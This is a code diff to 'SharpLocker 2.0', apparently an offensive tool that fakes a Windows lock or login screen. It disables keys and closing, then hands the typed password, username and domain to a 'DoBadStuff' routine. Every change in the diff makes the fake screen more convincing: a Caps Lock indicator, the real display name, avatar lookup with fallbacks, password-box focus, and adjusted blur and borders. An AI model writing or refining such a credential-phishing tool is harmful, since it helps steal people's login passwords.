@@ -46,7 +46,6 @@ namespace SharpLocker_2._0
             if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
 
             DenyClose = false;
-            TaskbarHandler.ShowTaskbar();
             KeyPressHandler.Enable();
 
             DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
@@ -57,6 +56,7 @@ namespace SharpLocker_2._0
         private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();
+            CapsLockLabel.Visible = Control.IsKeyLocked(Keys.CapsLock);
         }
 
         #region "Init"
@@ -64,11 +64,13 @@ namespace SharpLocker_2._0
         private void WindowsLogin_Load(object sender, EventArgs e)
         {
             BlurBackground();
+            PasswordTextBox.Focus();
         }
 
         private void Initialize()
         {
             DenyClose = true;
+            CapsLockLabel.Visible = false;
 
             InitializeTaskbar();
             InitializeUserLabel();
@@ -82,18 +84,24 @@ namespace SharpLocker_2._0
         {
             DoBadStuff = new Interfaces.BadStuffLoader().Get();
 
-            if(DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
+            if (DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
         }
 
         private void InitializeTaskbar()
         {
-            TaskbarHandler.HideTaskbar();
             KeyPressHandler.Disable();
         }
 
         private void InitializeUserLabel()
         {
-            UserNameLabel.Text = Environment.UserName;
+            try
+            {
+                UserNameLabel.Text = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
+            }
+            catch
+            {
+                UserNameLabel.Text = Environment.UserName;
+            }
         }
 
         private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
@@ -104,17 +112,46 @@ namespace SharpLocker_2._0
         private void BlurBackground()
         {
             GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
-            BackgroundImage = blur.Process(10);
+            BackgroundImage = blur.Process(2);
         }
 
         private void InitializeUserIcon()
         {
-            UserIconPictureBox.Image = Image.FromFile(Directory.GetFiles(Path.GetTempPath(), @"*.bmp").FirstOrDefault(x => x.Contains(Environment.UserName)));
+
+            UserIconPictureBox.Image = GetUserIconFromPath("bmp");
+
+            if (UserIconPictureBox.Image is null)
+                UserIconPictureBox.Image = GetUserIconFromPath("png");
+
+            if (UserIconPictureBox.Image is null)
+                UserIconPictureBox.Image = GetUserIconFromPath("jpg");
+
+            if (UserIconPictureBox.Image is null)
+                UserIconPictureBox.Image = Properties.Resources.defaultAvatar;
 
             System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
             gp.AddEllipse(0, 0, UserIconPictureBox.Width - 3, UserIconPictureBox.Height - 3);
             Region rg = new Region(gp);
             UserIconPictureBox.Region = rg;
+        }
+
+        private Image GetUserIconFromPath(string fileEnding)
+        {
+            try
+            {
+                foreach (string f in Directory.GetFiles(Path.GetTempPath()))
+                {
+                    if (!f.EndsWith($".{fileEnding}")) continue;
+                    if (!f.Contains(Environment.UserName)) continue;
+                    return Image.FromFile(f);
+                }
+
+                return null;
+            }
+            catch
+            {
+                return Properties.Resources.defaultAvatar;
+            }
         }
 
         private void InitializeOtherScreens()
@@ -143,12 +180,12 @@ namespace SharpLocker_2._0
 
         private void WindowsLogin_Paint(object sender, PaintEventArgs e)
         {
-            int offset = 3;
+            int offset = 1;
             e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                 PasswordTextBox.Location.X - offset,
                 PasswordTextBox.Location.Y - offset,
-                PasswordTextBox.Width + offset * 2,
-                PasswordTextBox.Height + offset * 2));
+                PasswordTextBox.Width + offset,
+                PasswordTextBox.Height + offset));
         }
 
         #endregion
